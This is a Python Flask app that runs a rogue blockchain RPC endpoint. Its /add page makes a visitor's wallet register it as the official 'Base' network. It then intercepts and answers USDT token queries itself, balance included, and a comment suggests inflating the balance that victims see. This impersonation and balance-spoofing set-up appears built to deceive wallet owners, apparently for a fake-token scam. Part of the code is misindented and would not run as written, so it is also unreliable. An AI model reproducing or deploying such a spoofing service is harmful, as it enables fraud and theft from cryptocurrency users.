from flask import Flask, request, jsonify, render_template_string
import requests
import os
from web3 import Web3

app = Flask(__name__)

# Use the real USDT address on Base
REAL_USDT = "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb"
BASE_RPC = "https://mainnet.base.org"
w3 = Web3(Web3.HTTPProvider(BASE_RPC))

ERC20_ABI = [
    {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "symbol", "outputs": [{"name": "", "type": "string"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "name", "outputs": [{"name": "", "type": "string"}], "type": "function"},
    {"constant": True, "inputs": [], "name": "totalSupply", "outputs": [{"name": "", "type": "uint256"}], "type": "function"}
]

usdt_contract = w3.eth.contract(address=Web3.to_checksum_address(REAL_USDT), abi=ERC20_ABI)

try:
    USDT_DECIMALS = usdt_contract.functions.decimals().call()
except Exception:
    USDT_DECIMALS = 6

USDT_TOTAL_SUPPLY = 100_000_000_000 * (10 ** 6)

# RPC Routes
@app.route('/rpc', methods=['GET'])
def rpc_health():
    return jsonify({"status": "ok", "message": "RPC endpoint is operational"})

@app.route('/rpc', methods=['POST'])
def handle_rpc():
    data = request.get_json()
    method = data.get("method")
    call_id = data.get("id", 1)

    if method == "eth_chainId":
        return jsonify({"jsonrpc": "2.0", "id": call_id, "result": "0x2105"})
    if method in ["wallet_switchEthereumChain", "wallet_addEthereumChain"]:
        return jsonify({"jsonrpc": "2.0", "id": call_id, "result": "0x2105" if method == "wallet_switchEthereumChain" else True})
    if method == "eth_call" and data.get("params") and len(data["params"]) > 0:
        call_obj = data["params"][0]
        if call_obj.get("to") and call_obj["to"].lower() == REAL_USDT.lower():
            data_field = call_obj.get("data", "")
            if not data_field:
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": "0x"})

            function_signature = data_field[:10]

            if function_signature == "0x70a08231":  # balanceOf
                try:
                    address = Web3.to_checksum_address("0x" + data_field[34:74])
                    # We're now directly using the same contract to query and modify balance
                    real_balance = usdt_contract.functions.balanceOf(address).call()
                    app.logger.info(f"Queried balance for {address}: {real_balance} USDT")
                    
                    # You can modify the balance here if needed
                    # For example, multiply by 2 to show double balance
                    # modified_balance = real_balance * 2
                    
                    result = "0x" + hex(real_balance)[2:].zfill(64)
                    app.logger.info(f"Returning balance: {real_balance} USDT")
                except Exception as e:
                    app.logger.error(f"Balance query failed for {address}: {str(e)}")
                    result = "0x" + hex(0)[2:].zfill(64)
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

elif function_signature == "0x313ce567":  # decimals
                result = "0x" + hex(6)[2:].zfill(64)
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

            elif function_signature == "0x95d89b41":  # symbol
                symbol = "USDT"  # Clean symbol for better recognition
                length = len(symbol)
                length_hex = hex(32)[2:].zfill(64)
                str_length_hex = hex(length)[2:].zfill(64)
                str_hex = symbol.encode("utf-8").hex().ljust(64, "0")
                result = "0x" + length_hex + str_length_hex + str_hex
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

            elif function_signature == "0x06fdde03":  # name
                name = "Tether USD"  # Clean name for better recognition
                length = len(name)
                length_hex = hex(32)[2:].zfill(64)
                str_length_hex = hex(length)[2:].zfill(64)
                str_hex = name.encode("utf-8").hex().ljust(64, "0")
                result = "0x" + length_hex + str_length_hex + str_hex
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

            elif function_signature == "0x18160ddd":  # totalSupply
                result = "0x" + hex(USDT_TOTAL_SUPPLY)[2:].zfill(64)
                return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})

    # For all other methods, proxy to the real Base RPC
    response = requests.post(BASE_RPC, json=data, headers={"Content-Type": "application/json"})
    return jsonify(response.json())

# Frontend Routes
@app.route('/add')
def add_network():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Adding Network</title>
        <script>
            function waitForEthereum() {
                return new Promise((resolve, reject) => {
                    if (window.ethereum) return resolve(window.ethereum);
                    let attempts = 0;
                    const maxAttempts = 20;
                    const checkInterval = setInterval(() => {
                        attempts++;
                        if (window.ethereum) {
                            clearInterval(checkInterval);
                            return resolve(window.ethereum);
                        }
                        if (attempts >= maxAttempts) {
                            clearInterval(checkInterval);
                            reject(new Error('No wallet detected after 10s'));
                        }
                    }, 500);
                });
            }

            window.onload = async () => {
                try {
                    const ethereum = await waitForEthereum();
                    console.log("Adding network...");
                    await ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x2105',
                            chainName: 'Base',  // Using official name for better recognition
                            rpcUrls: ['https://stbl-rpc.onrender.com/rpc'],  // Your RPC URL
                            nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
                            blockExplorerUrls: ['https://basescan.org']
                        }]
                    });
                    console.log("Network added, redirecting...");
                    window.location.href = '/';
                } catch (error) {
                    console.error('Network addition failed:', error);
                    document.body.innerHTML = '<p>Failed to add network: ' + error.message + '</p><p><a href="/">Go to token addition</a></p>';
                }
            };
        </script>
    </head>
    <body>
        <p>Adding network, please wait...</p>
    </body>
    </html>
    """)

@app.route('/')
def add_token():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Add USDT Token</title>
        <style>
            body { font-family: 'Roboto', sans-serif; background-color: #f5f5f5; color: #333; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
            h1 { font-size: 24px; margin-bottom: 10px; }
            p { font-size: 16px; margin-bottom: 20px; }
            .token-info { background: #f9f9f9; padding: 10px; border-radius: 5px; margin-bottom: 20px; text-align: left; }
            .token-info img { width: 32px; vertical-align: middle; margin-right: 10px; }
            .status { margin-top: 10px; font-size: 14px; color: #666; }
            button { background: #0066cc; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 20px; }
            @media (max-width: 480px) { .container { margin: 10px; } }
        </style>
        <script>
            function waitForEthereum() {
                return new Promise((resolve, reject) => {
                    if (window.ethereum) return resolve(window.ethereum);
                    let attempts = 0;
                    const maxAttempts = 20;
                    const checkInterval = setInterval(() => {
                        attempts++;
                        if (window.ethereum) {
                            clearInterval(checkInterval);
                            return resolve(window.ethereum);
                        }
                        if (attempts >= maxAttempts) {
                            clearInterval(checkInterval);
                            reject(new Error('No wallet detected after 10s'));
                        }
                    }, 500);
                });
            }

            async function addToken() {
                const status = document.getElementById('status');
                try {
                    const ethereum = await waitForEthereum();
                    status.textContent = 'Requesting account access...';
                    await ethereum.request({ method: 'eth_requestAccounts' });
                    status.textContent = 'Switching to Base network...';
                    await ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: '0x2105' }]
                    });
                    status.textContent = 'Checking balance...';
                    const accounts = await ethereum.request({ method: 'eth_accounts' });
                    const account = accounts[0];
                    const tokenAddress = '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb'; // Real USDT address
                    const functionSelector = '0x70a08231';
                    const paddedAddress = account.slice(2).padStart(64, '0');
                    const data = functionSelector + paddedAddress;
                    const balance = await ethereum.request({
                        method: 'eth_call',
                        params: [{ to: tokenAddress, data: data }, 'latest']
                    });
                    console.log('Account:', account, 'Balance (hex):', balance);
                    status.textContent = 'Adding token...';
                    await ethereum.request({
                        method: 'wallet_watchAsset',
                        params: {
                            type: 'ERC20',
                            options: {
                                address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', // Real USDT address
                                symbol: 'USDT',
                                decimals: 6,
                                image: 'https://assets.coingecko.com/coins/images/325/large/Tether.png'
                            }
                        }
                    });
                    status.textContent = 'Token added! Check Base network in wallet.';
                    document.getElementById('refresh-button').style.display = 'block';
                } catch (error) {
                    status.textContent = 'Failed: ' + error.message;
                    if (error.code === 4902) status.textContent += ' (Add network first at /add)';
                }
            }
        </script>
    </head>
    <body>
        <div class="container">
            <h1>Add USDT Token</h1>
            <p>Add the USDT token to your wallet</p>
            <div class="token-info">
                <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" alt="USDT">
                <span>Tether USD</span>
            </div>
            <button onclick="addToken()">Add Token to Wallet</button>
            <div id="status" class="status"></div>
            <button id="refresh-button" style="display: none; background: #666;" onclick="location.reload()">Refresh</button>
        </div>
    </body>
    </html>
    """)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)
